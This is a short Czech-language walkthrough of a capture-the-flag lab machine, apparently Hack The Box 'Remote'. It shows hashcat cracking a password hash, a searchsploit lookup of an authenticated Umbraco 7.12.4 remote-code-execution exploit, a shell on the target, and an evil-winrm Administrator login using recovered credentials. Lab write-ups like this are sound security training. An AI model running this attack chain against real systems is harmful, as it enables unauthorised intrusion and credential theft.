### Lámání hesel nebo hashů
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`hashcat -m 100 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
```
=> baconandcheese
=> admin@htb.local:baconandcheese
```

### Identifikace a hledání exploitu
Zjišťuji technologii a ověřuji známé zranitelnosti.
`searchsploit umbraco`
```
=> Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution | exploits/aspx/webapps/46153.py
```

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`python3 umbraco.py`
```
PS C:\users\Public> cat user.txt
__CENSORED__
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`./evil-winrm/evil-winrm.rb -i $IP -u Administrator -p '!R3m0te!'`

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat root.txt`
```
__CENSORED__
```
